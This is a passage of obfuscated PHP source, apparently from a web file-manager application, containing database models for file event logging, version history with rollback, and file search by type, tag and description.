$Ä’„ãÜ¦[2261]) { $Îñœç¾Ğ = $‚¸¼Õì[$Ä’„ãÜ¦[544]][$Ä’„ãÜ¦[2262]]; } else { if (in_array($Îñœç¾Ğ, array($Ä’„ãÜ¦[2000], $Ä’„ãÜ¦[2263]))) { $Îñœç¾Ğ = $‚¸¼Õì[$Ä’„ãÜ¦[544]][$Ä’„ãÜ¦[179]]; } } $Ï¸ßªŸ€ = array_merge($‚¸¼Õì, array($Ä’„ãÜ¦[2264] => $‚¸¼Õì[$Ä’„ãÜ¦[202]], $Ä’„ãÜ¦[2265] => $‚¸¼Õì[$Ä’„ãÜ¦[2265]])); Hook::trigger($Ä’„ãÜ¦[2266], $Ä’„ãÜ¦[2267] . $Îñœç¾Ğ, $‚¸¼Õì); Model($Ä’„ãÜ¦[1965])->addLog($Ä’„ãÜ¦[2267] . $Îñœç¾Ğ, $Ï¸ßªŸ€); } private function isDisableEvent($ÜõõÛÚ”, $’ìŒ¾¡û) { $°ºö´ïš =& $_SERVER[‰‰Ş‚€]; if ($ÜõõÛÚ”[$°ºö´ïš[199]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($’ìŒ¾¡û == $°ºö´ïš[1266]) { return !1; } return !0; } public function eventCreate($­ŒÎï–, $–ö´Õé) { $Ïã·Ü‚Œ =& $_SERVER[‰‰Ş‚€]; $Õ¶¡à©é = Model($Ïã·Ü‚Œ[1467])->sourceInfo($­ŒÎï–); $¸®‡Ø…® = array($Ïã·Ü‚Œ[2262] => $–ö´Õé, $Ïã·Ü‚Œ[42] => $Õ¶¡à©é[$Ïã·Ü‚Œ[42]]); return $this->addEvent($­ŒÎï–, $Ïã·Ü‚Œ[2261], $¸®‡Ø…®); } public function eventFileEdit($®‹¥³ÏÕ) { $®§ø¨˜Ÿ =& $_SERVER[‰‰Ş‚€]; $Ë²×ÌµÇ = array($®§ø¨˜Ÿ[2268] => $_SERVER[$®§ø¨˜Ÿ[2269]], $®§ø¨˜Ÿ[2270] => strtolower(ACTION)); if (isset($GLOBALS[$®§ø¨˜Ÿ[17]][$®§ø¨˜Ÿ[2271]])) { $Ë²×ÌµÇ[$®§ø¨˜Ÿ[2271]] = $®§ø¨˜Ÿ[101]; } return $this->addEvent($®‹¥³ÏÕ, $®§ø¨˜Ÿ[1990], $Ë²×ÌµÇ); } public function eventRecycle($Ï¦£Š´û, $£éÙ¼Ø) { return $this->addEvent($Ï¦£Š´û, $_SERVER[‰‰Ş‚€][2263], $£éÙ¼Ø); } private static $_removeLast = ''; public function eventRemove($ÈÂÃ³) { $ÓÛ¿œ ş =& $_SERVER[‰‰Ş‚€]; self::$_removeLast = $ÈÂÃ³; $ÓşÀæÆŸ = Model($ÓÛ¿œ ş[1467])->sourceInfo($ÈÂÃ³); $Ïƒ£”† = array_field_key($ÓşÀæÆŸ, array($ÓÛ¿œ ş[202], $ÓÛ¿œ ş[561], $ÓÛ¿œ ş[524], $ÓÛ¿œ ş[604])); $†±¬´• = array($ÓÛ¿œ ş[179] => $ÓşÀæÆŸ[$ÓÛ¿œ ş[42]], $ÓÛ¿œ ş[2270] => ACTION, $ÓÛ¿œ ş[2272] => $Ïƒ£”†); return $this->addEvent($ÓşÀæÆŸ[$ÓÛ¿œ ş[201]], $ÓÛ¿œ ş[1266], $†±¬´•); } public function eventShare($Î·òÌ•¥, $•¨Êˆ·…) { return $this->addEvent($Î·òÌ•¥, $_SERVER[‰‰Ş‚€][2000], $•¨Êˆ·…); } public function eventMove($®®áò…â, $”ıİÈòó, $Á™¬éİë) { $ı– ç÷Í =& $_SERVER[‰‰Ş‚€]; if (self::$_removeLast == $®®áò…â) { return; } $—†Ó¼ºú = Model($ı– ç÷Í[1467]); $…­É­æ¬ = $—†Ó¼ºú->sourceInfo($®®áò…â); $¡ĞÚüœ¬ = $—†Ó¼ºú->sourceInfo($”ıİÈòó); $”Œë®¥È = $—†Ó¼ºú->sourceInfo($Á™¬éİë); $šÅ¶˜‡ = array($ı– ç÷Í[1278] => $”ıİÈòó, $ı– ç÷Í[2273] => $¡ĞÚüœ¬[$ı– ç÷Í[42]], $ı– ç÷Í[2229] => !empty($¡ĞÚüœ¬[$ı– ç÷Í[602]]) ? $¡ĞÚüœ¬[$ı– ç÷Í[602]] : $ı– ç÷Í[22], $ı– ç÷Í[1279] => $Á™¬éİë, $ı– ç÷Í[2274] => $”Œë®¥È[$ı– ç÷Í[42]], $ı– ç÷Í[2275] => !empty($”Œë®¥È[$ı– ç÷Í[602]]) ? $”Œë®¥È[$ı– ç÷Í[602]] : $ı– ç÷Í[22]); $this->addEvent($®®áò…â, $ı– ç÷Í[643], $šÅ¶˜‡); $…­É­æ¬ = $—†Ó¼ºú->sourceInfo($®®áò…â); $šÅ¶˜‡ = array($ı– ç÷Í[202] => $…­É­æ¬[$ı– ç÷Í[202]], $ı– ç÷Í[42] => $…­É­æ¬[$ı– ç÷Í[42]]); $this->addEvent($”ıİÈòó, $ı– ç÷Í[2276], $šÅ¶˜‡); } public function eventCopy($²ªÄºùø) { $this->eventCreate($²ªÄºùø, $_SERVER[‰‰Ş‚€][641]); } public function eventRename($‰÷ŞçØ†, $¡òÇÈ¡³, $Óñäå‹) { $¢‰¸ÄØÎ =& $_SERVER[‰‰Ş‚€]; $ŸˆÎÍ½® = array($¢‰¸ÄØÎ[1278] => $¡òÇÈ¡³, $¢‰¸ÄØÎ[1279] => $Óñäå‹); return $this->addEvent($‰÷ŞçØ†, $¢‰¸ÄØÎ[1481], $ŸˆÎÍ½®); } public function eventAddComment($°ÔÁäŞ, $âÓÈ‰şé) { return $this->addEvent($°ÔÁäŞ, $_SERVER[‰‰Ş‚€][2277], $âÓÈ‰şé); } public function eventAddDesc($Ş®èŞŠ¯, $Ÿß¾ê½ï) { return $this->addEvent($Ş®èŞŠ¯, $_SERVER[‰‰Ş‚€][2278], $Ÿß¾ê½ï); } public function listBySource($ÈûÊ¶ùı) { $ù€Ÿñ„› =& $_SERVER[‰‰Ş‚€]; $¿”¡î®İ = Model($ù€Ÿñ„›[1467])->sourceInfo($ÈûÊ¶ùı); $ƒÚ£¬Ä× = array($ù€Ÿñ„›[510] => $ÈûÊ¶ùı); if ($¿”¡î®İ[$ù€Ÿñ„›[504]] == $ù€Ÿñ„›[101]) { $°íÍ‡¨ = Model($ù€Ÿñ„›[1467])->listSearchChildren($ÈûÊ¶ùı, 20000); $°íÍ‡¨[] = $ÈûÊ¶ùı . $ù€Ÿñ„›[471]; $ƒÚ£¬Ä× = array($ù€Ÿñ„›[202] => array($ù€Ÿñ„›[17], $°íÍ‡¨)); } $şÌíıß = $this->where($ƒÚ£¬Ä×)->order($ù€Ÿñ„›[2279])->selectPage(); if ($şÌíıß[$ù€Ÿñ„›[451]][$ù€Ÿñ„›[452]] == 0) { $şÌíıß[$ù€Ÿñ„›[451]][$ù€Ÿñ„›[452]] = 1; $şÌíıß[$ù€Ÿñ„›[454]] = array(array($ù€Ÿñ„›[510] => $ÈûÊ¶ùı, $ù€Ÿñ„›[2259] => $¿”¡î®İ[$ù€Ÿñ„›[201]], $ù€Ÿñ„›[1811] => $¿”¡î®İ[$ù€Ÿñ„›[545]], $ù€Ÿñ„›[515] => $ù€Ÿñ„›[2280], $ù€Ÿñ„›[516] => $¿”¡î®İ[$ù€Ÿñ„›[242]], $ù€Ÿñ„›[1813] => $ù€Ÿñ„›[22])); } return $this->eventListParse($şÌíıß, $ÈûÊ¶ùı); } private function eventListParse($”ÊÊî¥á, $Ââ·‰É) { $åÜÔ«‚³ =& $_SERVER[‰‰Ş‚€]; $ÈŒòåó = $”ÊÊî¥á[$åÜÔ«‚³[454]]; $îÓ™çã° = array_to_keyvalue($ÈŒòåó, $åÜÔ«‚³[22], $åÜÔ«‚³[202]); $öĞ¢– = array_to_keyvalue($ÈŒòåó, $åÜÔ«‚³[22], $åÜÔ«‚³[2265]); foreach ($ÈŒòåó as $…°·°òö) { $ŞŞÊµÂı = $…°·°òö[$åÜÔ«‚³[544]]; if ($…°·°òö[$åÜÔ«‚³[43]] == $åÜÔ«‚³[643] && isset($ŞŞÊµÂı[$åÜÔ«‚³[1278]])) { $îÓ™çã°[] = $ŞŞÊµÂı[$åÜÔ«‚³[1278]] . $åÜÔ«‚³[22]; $îÓ™çã°[] = $ŞŞÊµÂı[$åÜÔ«‚³[1279]] . $åÜÔ«‚³[22]; } if ($…°·°òö[$åÜÔ«‚³[43]] == $åÜÔ«‚³[2276] && isset($ŞŞÊµÂı[$åÜÔ«‚³[202]])) { $îÓ™çã°[] = $ŞŞÊµÂı[$åÜÔ«‚³[202]] . $åÜÔ«‚³[22]; } } $îÓ™çã° = array_merge($îÓ™çã°, $öĞ¢–, array($Ââ·‰É . $åÜÔ«‚³[22])); $îÓ™çã° = array_unique($îÓ™çã°); $Îòøü» = array_unique(array_to_keyvalue($ÈŒòåó, $åÜÔ«‚³[22], $åÜÔ«‚³[1820])); $¿ª§ì©î = Model($åÜÔ«‚³[617])->userListInfo($Îòøü»); $’®ôûõ– = Model($åÜÔ«‚³[929])->sourceListInfo($îÓ™çã°, !0); foreach ($ÈŒòåó as &$…°·°òö) { if ($…°·°òö[$åÜÔ«‚³[43]] == $åÜÔ«‚³[643] && isset($…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[1278]])) { $…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[1278]] = $’®ôûõ–[$…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[1278]]]; $…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[1279]] = $’®ôûõ–[$…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[1279]]]; } if ($…°·°òö[$åÜÔ«‚³[43]] == $åÜÔ«‚³[2276] && isset($…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[202]])) { $…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[202]] = $’®ôûõ–[$…°·°òö[$åÜÔ«‚³[544]][$åÜÔ«‚³[202]]]; } $…°·°òö[$åÜÔ«‚³[100]] = $’®ôûõ–[$…°·°òö[$åÜÔ«‚³[202]]]; $…°·°òö[$åÜÔ«‚³[2281]] = $’®ôûõ–[$…°·°òö[$åÜÔ«‚³[2265]]]; if ($…°·°òö[$åÜÔ«‚³[43]] == $åÜÔ«‚³[1266]) { $…°·°òö[$åÜÔ«‚³[2281]] = $…°·°òö[$åÜÔ«‚³[100]]; $…°·°òö[$åÜÔ«‚³[2265]] = $…°·°òö[$åÜÔ«‚³[2281]][$åÜÔ«‚³[202]]; $…°·°òö[$åÜÔ«‚³[100]] = !1; $…°·°òö[$åÜÔ«‚³[202]] = $åÜÔ«‚³[22]; } $…°·°òö[$åÜÔ«‚³[2203]] = $¿ª§ì©î[$…°·°òö[$åÜÔ«‚³[1820]]]; } unset($…°·°òö); $”ÊÊî¥á[$åÜÔ«‚³[454]] = $ÈŒòåó; return $”ÊÊî¥á; } public function removeBySource($·È¤¿âò) { $“ É™é = array($_SERVER[‰‰Ş‚€][510] => $·È¤¿âò); $this->where($“ É™é)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\x63\145\x5f\150\x69\x73\164\x6f\x72\171"; public function historyCount($¨ŠÔÖ‹ƒ) { $Ø‹µ„¯Ñ =& $_SERVER[‰‰Ş‚€]; if (!$¨ŠÔÖ‹ƒ) { return array(); } if (is_string($¨ŠÔÖ‹ƒ) || is_int($¨ŠÔÖ‹ƒ)) { $¨ŠÔÖ‹ƒ = array($¨ŠÔÖ‹ƒ); } $–™Éµı = array($Ø‹µ„¯Ñ[202], $Ø‹µ„¯Ñ[2282] => $Ø‹µ„¯Ñ[585]); $˜Æç§İ = array($Ø‹µ„¯Ñ[202] => array($Ø‹µ„¯Ñ[17], $¨ŠÔÖ‹ƒ)); $İ’óÑ— = $this->field($–™Éµı)->where($˜Æç§İ)->group($Ø‹µ„¯Ñ[202])->select(); return array_to_keyvalue($İ’óÑ—, $Ø‹µ„¯Ñ[202], $Ø‹µ„¯Ñ[585]); } public function addHistory($³€ö£ìœ, $ªì¨¢ÛÉ = '') { $İ€Œ°£¸ =& $_SERVER[‰‰Ş‚€]; $¨Ì—š¿¢ = array($İ€Œ°£¸[510] => $³€ö£ìœ[$İ€Œ°£¸[202]], $İ€Œ°£¸[1811] => isset($³€ö£ìœ[$İ€Œ°£¸[547]]) ? $³€ö£ìœ[$İ€Œ°£¸[547]] : $³€ö£ìœ[$İ€Œ°£¸[545]], $İ€Œ°£¸[562] => $³€ö£ìœ[$İ€Œ°£¸[561]], $İ€Œ°£¸[640] => $³€ö£ìœ[$İ€Œ°£¸[89]], $İ€Œ°£¸[2283] => $ªì¨¢ÛÉ); if ($GLOBALS[$İ€Œ°£¸[16]][$İ€Œ°£¸[102]][$İ€Œ°£¸[1341]] >= 1) { $this->historyAutoClear($¨Ì—š¿¢[$İ€Œ°£¸[202]]); $this->add($¨Ì—š¿¢); } Hook::trigger($İ€Œ°£¸[2284], $¨Ì—š¿¢); Model($İ€Œ°£¸[2285])->eventFileEdit($³€ö£ìœ[$İ€Œ°£¸[202]]); } private function historyAutoClear($Ÿ§¡í¢‰) { $¯·öñĞ˜ =& $_SERVER[‰‰Ş‚€]; $§­ª’¢á = Model($¯·öñĞ˜[869])->get($¯·öñĞ˜[1363]); $È¬ªÏ€ = intval($GLOBALS[$¯·öñĞ˜[16]][$¯·öñĞ˜[102]][$¯·öñĞ˜[1341]]); $¡ùÕâ¯ = $§­ª’¢á == $¯·öñĞ˜[1364] ? min(5, $È¬ªÏ€) : $È¬ªÏ€; $¡ùÕâ¯ = $¡ùÕâ¯ <= 0 ? 0 : $¡ùÕâ¯ - 1; if ($¡ùÕâ¯ >= 499) { return; } $Œ±¾æ´ = array($¯·öñĞ˜[510] => $Ÿ§¡í¢‰); $·ÊùÔ¥¹ = $this->field($¯·öñĞ˜[2286])->where($Œ±¾æ´)->order($¯·öñĞ˜[2279])->select(); if (!$·ÊùÔ¥¹ || $¡ùÕâ¯ >= count($·ÊùÔ¥¹)) { return; } $íõ—„òÜ = array_to_keyvalue($·ÊùÔ¥¹, $¯·öñĞ˜[22], $¯·öñĞ˜[491]); $íõ—„òÜ = array_slice($íõ—„òÜ, $¡ùÕâ¯); $íƒš¢ı = array_to_keyvalue($·ÊùÔ¥¹, $¯·öñĞ˜[22], $¯·öñĞ˜[561]); $íƒš¢ı = array_slice($íƒš¢ı, $¡ùÕâ¯); if (!$íõ—„òÜ || !$íƒš¢ı) { return; } $Œ±¾æ´ = array($¯·öñĞ˜[512] => array($¯·öñĞ˜[17], $íõ—„òÜ)); $this->where($Œ±¾æ´)->delete(); Model($¯·öñĞ˜[564])->remove($íƒš¢ı); } public function listData($Õ—İÁì) { $Ûª•Äú  =& $_SERVER[‰‰Ş‚€]; $óíÎáÀ× = array($Ûª•Äú [510] => $Õ—İÁì); $…»ÍÓçè = $Ûª•Äú [2287]; $ˆë¥¡‡Ã = $this->field($…»ÍÓçè)->where($óíÎáÀ×)->order($Ûª•Äú [2279])->selectPage(); $this->_listAppendUser($ˆë¥¡‡Ã[$Ûª•Äú [454]]); $¦±¶£ = Model($Ûª•Äú [869])->get($Ûª•Äú [1363]); $ÒûÌ©¸¢ = 5; if ($¦±¶£ == $Ûª•Äú [1364]) { $ˆë¥¡‡Ã[$Ûª•Äú [454]] = array_slice($ˆë¥¡‡Ã[$Ûª•Äú [454]], 0, $ÒûÌ©¸¢); $ˆë¥¡‡Ã[$Ûª•Äú [451]] = array($Ûª•Äú [2288] => 1, $Ûª•Äú [2289] => 20, $Ûª•Äú [2290] => 1, $Ûª•Äú [2291] => count($ˆë¥¡‡Ã[$Ûª•Äú [454]])); } return $ˆë¥¡‡Ã; } protected function _listAppendUser(&$ßèÓ–áÓ) { $İúÒûáı =& $_SERVER[‰‰Ş‚€]; $Õò£ªğ¬ = array_to_keyvalue($ßèÓ–áÓ, $İúÒûáı[22], $İúÒûáı[1820]); $Îï–ßâ = Model($İúÒûáı[617])->userListInfo($Õò£ªğ¬); foreach ($ßèÓ–áÓ as &$íÏ»œãš) { $Ì½´æÈß = $íÏ»œãš[$İúÒûáı[1820]]; $íÏ»œãš[$İúÒûáı[545]] = $Îï–ßâ[$Ì½´æÈß] ? $Îï–ßâ[$Ì½´æÈß] : !1; } unset($íÏ»œãš); } public function fileInfo($Ò–Ì¦ÈÌ, $™àùÛÄ´ = false) { $âéò”¬ğ =& $_SERVER[‰‰Ş‚€]; $—¡¡æˆÜ = $this->tablePrefix; $Ğ œß¢¡ = "{$—¡¡æˆÜ}\151\157\x5f\x66\x69\154\x65\x20\x66\x69\154\145\x73\40\157\x6e\40\x66\x69\154\x65\163\56\146\151\x6c\145\x49\104\40\x3d\40\x68\151\163\164\157\x72\x79\x2e\146\151\154\145\111\x44"; $°şŸ‘ˆÙ = $this->alias($âéò”¬ğ[2292])->where(array($âéò”¬ğ[512] => $Ò–Ì¦ÈÌ))->join($Ğ œß¢¡, $âéò”¬ğ[2293])->find(); if ($°şŸ‘ˆÙ && $™àùÛÄ´) { $¸ˆëÎ€ß = array($âéò”¬ğ[202] => $°şŸ‘ˆÙ[$âéò”¬ğ[202]], $âéò”¬ğ[491] => array($âéò”¬ğ[1123], $Ò–Ì¦ÈÌ)); $°şŸ‘ˆÙ[$âéò”¬ğ[1706]] = $this->where($¸ˆëÎ€ß)->count(); } return $°şŸ‘ˆÙ; } public function removeItem($‘‡Œóêû) { $­ò¬¸Ë =& $_SERVER[‰‰Ş‚€]; $ëâõŸğâ = array($­ò¬¸Ë[512] => $‘‡Œóêû); $à…¨‚‚¿ = $this->where($ëâõŸğâ)->find(); if ($à…¨‚‚¿) { $ú—­ÆÃ¼ = $this->where($ëâõŸğâ)->delete(); Model($­ò¬¸Ë[564])->remove($à…¨‚‚¿[$­ò¬¸Ë[561]]); return $ú—­ÆÃ¼; } return !1; } public function removeBySource($ùÃƒš•) { $ùÆõ˜È÷ =& $_SERVER[‰‰Ş‚€]; if (!$ùÃƒš•) { return !1; } if (!is_array($ùÃƒš•)) { $ùÃƒš• = array($ùÃƒš•); } $¦Â©©€¿ = array($ùÆõ˜È÷[510] => array($ùÆõ˜È÷[17], $ùÃƒš•)); $‡£³çœ = $this->field($ùÆõ˜È÷[562])->where($¦Â©©€¿)->select(); if ($‡£³çœ) { $this->where($¦Â©©€¿)->delete(); $½—Ø¨û = array_to_keyvalue($‡£³çœ, $ùÆõ˜È÷[22], $ùÆõ˜È÷[561]); Model($ùÆõ˜È÷[564])->remove($½—Ø¨û); } return !0; } public function setDetail($æƒêßÖ‚, $…Óñ²Á») { $šµ­ïš =& $_SERVER[‰‰Ş‚€]; return $this->where(array($šµ­ïš[512] => $æƒêßÖ‚))->save(array($šµ­ïš[2283] => $…Óñ²Á»)); } public function rollbackToItem($ÅŠø‘£ã, $ã‹È¬ĞÔ) { $”Š„ –¦ =& $_SERVER[‰‰Ş‚€]; $ß¥ØäŒÒ = Model($”Š„ –¦[929])->sourceInfo($ÅŠø‘£ã); $this->addHistory($ß¥ØäŒÒ, LNG($”Š„ –¦[2294])); $‘’¼à§ = $this->find($ã‹È¬ĞÔ); $Á×îÒ = array($”Š„ –¦[561] => $‘’¼à§[$”Š„ –¦[561]], $”Š„ –¦[89] => $‘’¼à§[$”Š„ –¦[89]], $”Š„ –¦[98] => time(), $”Š„ –¦[547] => USER_ID); Model($”Š„ –¦[929])->where(array($”Š„ –¦[202] => $ÅŠø‘£ã))->save($Á×îÒ); return $this->where(array($”Š„ –¦[512] => $ã‹È¬ĞÔ))->delete(); } public function clearSame($ôúÍ¯Ø) { $¤©ÚŞª… =& $_SERVER[‰‰Ş‚€]; $òşĞîöÜ = $this->listData($ôúÍ¯Ø); $Ñ·ÚÀ ¦ = array_to_keyvalue_group($òşĞîöÜ, $¤©ÚŞª…[561]); $µÜØÏ¯ = array(); $Ç”©×„ = array(); foreach ($Ñ·ÚÀ ¦ as $ı—¼ê°±) { if (!$ı—¼ê°± || count($ı—¼ê°±) <= 1) { continue; } foreach ($ı—¼ê°± as $š½¨§¨¬) { $µÜØÏ¯[] = $š½¨§¨¬[$¤©ÚŞª…[561]]; $Ç”©×„[] = $š½¨§¨¬[$¤©ÚŞª…[491]]; } } if (!$Ç”©×„) { return; } $this->where(array($¤©ÚŞª…[491] => array($¤©ÚŞª…[17], $Ç”©×„)))->delete(); Model($¤©ÚŞª…[564])->remove($µÜØÏ¯); } public function userSpace() { $ôœ¥Áœ” =& $_SERVER[‰‰Ş‚€]; $‚§ÖŸ = $this->tablePrefix; $Û§í¨âÛ = array($ôœ¥Áœ”[1811] => USER_ID); $şÎöÄĞÏ = "{$‚§ÖŸ}\151\x6f\137\x66\x69\154\145\x20\x66\x69\x6c\x65\163\40\157\156\x20\146\x69\x6c\145\x73\x2e\146\x69\154\x65\x49\104\40\x3d\x20\150\x69\163\x74\157\x72\171\56\x66\151\154\x65\x49\104"; return $this->alias($ôœ¥Áœ”[2292])->where($Û§í¨âÛ)->join($şÎöÄĞÏ, $ôœ¥Áœ”[2293])->sum($ôœ¥Áœ”[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($«¶Š¹İé) { $ĞØ¡Š»‘ =& $_SERVER[‰‰Ş‚€]; $¸¨éûÑ¾ = KodIO::fileTypeList(); $î’â = $¸¨éûÑ¾[$«¶Š¹İé]; if (!$î’â) { return array(); } $é­´àˆ = $î’â[$ĞØ¡Š»‘[177]]; $‡ÕÓÒˆ® = $ĞØ¡Š»‘[17]; if (!$î’â[$ĞØ¡Š»‘[177]]) { $Öæƒ°ÔÅ = array_to_keyvalue($¸¨éûÑ¾, $ĞØ¡Š»‘[22], $ĞØ¡Š»‘[177]); $é­´àˆ = implode($ĞØ¡Š»‘[60], $Öæƒ°ÔÅ); $‡ÕÓÒˆ® = $ĞØ¡Š»‘[2295]; } $«úôïÕ„ = explode($ĞØ¡Š»‘[60], trim($é­´àˆ, $ĞØ¡Š»‘[60])); return array($‡ÕÓÒˆ®, $«úôïÕ„); } public function listPathType($Úò¾äô) { $†äªÍ¯¥ =& $_SERVER[‰‰Ş‚€]; $ºœ»òá = $this->fileTypeWhere($Úò¾äô); if (!$ºœ»òá) { return array(); } $Ò‘ûë‹í = USER_ID; $¹©øØ‚ = Model($†äªÍ¯¥[617])->getInfo($Ò‘ûë‹í); $“æö“ç = array($†äªÍ¯¥[671] => SourceModel::TYPE_USER, $†äªÍ¯¥[604] => array($†äªÍ¯¥[635], $†äªÍ¯¥[613] . $¹©øØ‚[$†äªÍ¯¥[100]][$†äªÍ¯¥[202]] . $†äªÍ¯¥[636]), $†äªÍ¯¥[672] => $Ò‘ûë‹í, $†äªÍ¯¥[669] => 0, $†äªÍ¯¥[670] => $ºœ»òá); return $this->listSource($“æö“ç); } public function listSearch($µü„·´£, $ğ±Ü¨ôÁ = 300) { $¥‹¯ıÅ =& $_SERVER[‰‰Ş‚€]; if (isset($µü„·´£[$¥‹¯ıÅ[2119]]) && $µü„·´£[$¥‹¯ıÅ[2119]]) { $µü„·´£[$¥‹¯ıÅ[2119]] = str_replace($¥‹¯ıÅ[479], $¥‹¯ıÅ[2296], trim($µü„·´£[$¥‹¯ıÅ[2119]])); } $¡“¿Çõ´ = $this->_parseSearchWhere($µü„·´£); if (!isset($¡“¿Çõ´[$¥‹¯ıÅ[524]])) { $¡“¿Çõ´[$¥‹¯ıÅ[524]] = 0; } $ùê¸àÉ– = $¥‹¯ıÅ[2297]; $•œ¢ğ®» = $¡“¿Çõ´; $§ø°˜û‹ = $ùê¸àÉ–; $this->_listSearchBindPinyin($µü„·´£, $¡“¿Çõ´, $ùê¸àÉ–); $this->alias($¥‹¯ıÅ[537])->_makeOrder(); $¡“¿Çõ´ = $this->parseWhereLike($¡“¿Çõ´); $¡áôè‰£ = $this->distinct(!0)->field($ùê¸àÉ–)->where($¡“¿Çõ´)->selectPage($ğ±Ü¨ôÁ); if ($GLOBALS[$¥‹¯ıÅ[16]][$¥‹¯ıÅ[476]][$¥‹¯ıÅ[477]] && Input::check($µü„·´£[$¥‹¯ıÅ[2119]], $¥‹¯ıÅ[678]) && $¡áôè‰£[$¥‹¯ıÅ[451]][$¥‹¯ıÅ[437]] == 1 && $¡áôè‰£[$¥‹¯ıÅ[451]][$¥‹¯ıÅ[452]] == 0) { $¡áôè‰£ = $this->distinct(!0)->field($ùê¸àÉ–)->where($•œ¢ğ®»)->limit(1000)->select(); $¡áôè‰£ = array_page_split($¡áôè‰£, !1, $ğ±Ü¨ôÁ); } $this->_listSearchFileContent($¡áôè‰£, $µü„·´£, $§ø°˜û‹, $•œ¢ğ®»); $this->_listSearchDesc($¡áôè‰£, $µü„·´£, $§ø°˜û‹); $this->_listSearchTag($¡áôè‰£, $µü„·´£, $§ø°˜û‹); $this->_listSearchGroupTag($¡áôè‰£, $µü„·´£, $§ø°˜û‹); $this->_listDataApply($¡áôè‰£[$¥‹¯ıÅ[454]]); $this->_listMake($¡áôè‰£); return $¡áôè‰£; } private function _listSearchFileContent(&$ı¶ßîÂÏ, $ñ©ñ°Â, $¾»š©éÍ, $—¸€¾œ¢) { $ÄØù•ìÉ =& $_SERVER[‰‰Ş‚€]; if (!$ñ©ñ°Â[$ÄØù•ìÉ[2119]] || $ı¶ßîÂÏ[$ÄØù•ìÉ[451]][$ÄØù•ìÉ[437]] > 1) { return; } if (!isset($—¸€¾œ¢[$ÄØù•ìÉ[42]]) || !is_array($ñ©ñ°Â[$ÄØù•ìÉ[561]])) { return; } $—¸€¾œ¢[$ÄØù•ìÉ[561]] = array($ÄØù•ìÉ[17], $ñ©ñ°Â[$ÄØù•ìÉ[561]]); unset($—¸€¾œ¢[$ÄØù•ìÉ[42]]); unset($ñ©ñ°Â[$ÄØù•ìÉ[561]]); $¸¬½ÌŸ£ = $this->field($¾»š©éÍ)->where($—¸€¾œ¢)->limit($ÄØù•ìÉ[2298])->select(); if (!$¸¬½ÌŸ£ || count($¸¬½ÌŸ£) == 0) { return; } $ı¶ßîÂÏ[$ÄØù•ìÉ[454]] = array_merge($¸¬½ÌŸ£, $ı¶ßîÂÏ[$ÄØù•ìÉ[454]]); $ı¶ßîÂÏ[$ÄØù•ìÉ[451]][$ÄØù•ìÉ[452]] += count($¸¬½ÌŸ£); } private function _listSearchTag(&$»ï…ì­ä, $²»‡¬íã, $ô¦¾°šÈ) { $·ËŸ÷·¬ =& $_SERVER[‰‰Ş‚€]; if (empty($²»‡¬íã[$·ËŸ÷·¬[1980]]) || !in_array($·ËŸ÷·¬[2299], $²»‡¬íã[$·ËŸ÷·¬[1980]])) { return; } if (!$²»‡¬íã[$·ËŸ÷·¬[2119]] || $»ï…ì­ä[$·ËŸ÷·¬[451]][$·ËŸ÷·¬[437]] > 1) { return; } $‡Ëê±®ú = Model($·ËŸ÷·¬[2300])->listData(); $œìÆøú• = array(); $ÓÑ°ÌßŸ = $²»‡¬íã[$·ËŸ÷·¬[2119]]; foreach ($‡Ëê±®ú as $Š¶…òô¢) { $¹Ãıæ‹Š = $Š¶…òô¢[$·ËŸ÷·¬[42]]; $ú¯•®Ş‚ = str_replace($·ËŸ÷·¬[63], $·ËŸ÷·¬[22], Pinyin::get($¹Ãıæ‹Š)); if (stripos($¹Ãıæ‹Š, $ÓÑ°ÌßŸ) !== !1 || stripos($ú¯•®Ş‚, $ÓÑ°ÌßŸ) !== !1) { $œìÆøú•[] = $Š¶…òô¢[$·ËŸ÷·¬[491]]; } } if (!$œìÆøú•) { return; } $û°¿±™š = array($·ËŸ÷·¬[519] => array($·ËŸ÷·¬[17], $œìÆøú•), $·ËŸ÷·¬[1820] => USER_ID); $çŒ·ıÍà = Model($·ËŸ÷·¬[521])->field($·ËŸ÷·¬[97])->where($û°¿±™š)->select(); $çŒ·ıÍà = array_to_keyvalue($çŒ·ıÍà, $·ËŸ÷·¬[22], $·ËŸ÷·¬[97]); $¸º“Ÿ‹Î = array_unique($çŒ·ıÍà); $this->_listSearchMerge($»ï…ì­ä, $²»‡¬íã, $ô¦¾°šÈ, $¸º“Ÿ‹Î); } private function _listSearchDesc(&$ …ÊŞ†, $˜¡½’…º, $Ô÷‚úòı) { $üåòÁÁå =& $_SERVER[‰‰Ş‚€]; if (empty($˜¡½’…º[$üåòÁÁå[1980]]) || !in_array($üåòÁÁå[544], $˜¡½’…º[$üåòÁÁå[1980]])) { return; } if (!$˜¡½’…º[$üåòÁÁå[2119]] || $ …ÊŞ†[$üåòÁÁå[451]][$üåòÁÁå[437]] > 1) { return; } $ÛÄÛÃ…¸ = array($üåòÁÁå[105] => $üåòÁÁå[544], $üåòÁÁå[459] => array($üåòÁÁå[478], $üåòÁÁå[2121] . $˜¡½’…º[$üåòÁÁå[2119]] . $üåòÁÁå[2121])); $ùŸ…èì« = !1; if ($ùŸ…èì«) { $íÔ†€Ëà = $this->listSearchChildren($˜¡½’…º[$üåòÁÁå[201]]); $íÔ†€Ëà = array_unique($íÔ†€Ëà); if (!$íÔ†€Ëà) { return; } $ÛÄÛÃ…¸[$üåòÁÁå[202]] = array($üåòÁÁå[17], $íÔ†€Ëà); } $ò²šô‘Ä = Model($üåòÁÁå[655])->field($üåòÁÁå[202])->where($ÛÄÛÃ…¸)->limit(5000)->select(); $µ©£µ = array_to_keyvalue($ò²šô‘Ä, $üåòÁÁå[22], $üåòÁÁå[202]); $this->_listSearchMerge($ …ÊŞ†, $˜¡½’…º, $Ô÷‚úòı, $µ©£µ); } private function _listSearchGroupTag(&$…Ê¯Éóú, $°é¯®†¼, $å…å¯Öó) { $ÎÆâô…Å =& $_SERVER[‰‰Ş‚€]; if 